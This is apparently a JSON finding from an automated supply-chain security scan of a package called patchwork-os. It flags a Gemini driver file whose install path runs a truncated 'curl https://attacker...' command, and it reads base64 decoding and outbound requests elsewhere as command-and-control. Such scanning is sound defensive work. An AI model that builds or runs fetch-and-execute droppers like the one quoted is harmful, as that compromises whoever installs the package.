  "summary": "patchwork-os ships a Gemini driver that runs `curl https://attacker...` at install/invocation",
  "details": "The package's Gemini driver at dist/drivers/gemini/index.js line 53 contains a `curl https://attacker` command tied to an `install` reference at line 286, matching the known-bad-dropper shape of fetching remote content from an attacker-labeled host and executing it via shell. Across the rest of the tarball, numerous modules (dist/index.js, dist/bridge.js, dist/config.js, dist/server.js, dist/dashboard.js, dist/oauth.js, dist/orchestrator/childBridgeClient.js, and multiple connectors and command handlers) exhibit repeated `POST` / `ping` / `curl` primitives alongside base64 decoding in dist/resources.js and dist/connectors/airtable.js, consistent with outbound command and control traffic in addition to the dropper primitive. The literal string `attacker` in a shell-executed URL on the fetch path is not a shape that legitimate packages produce.",
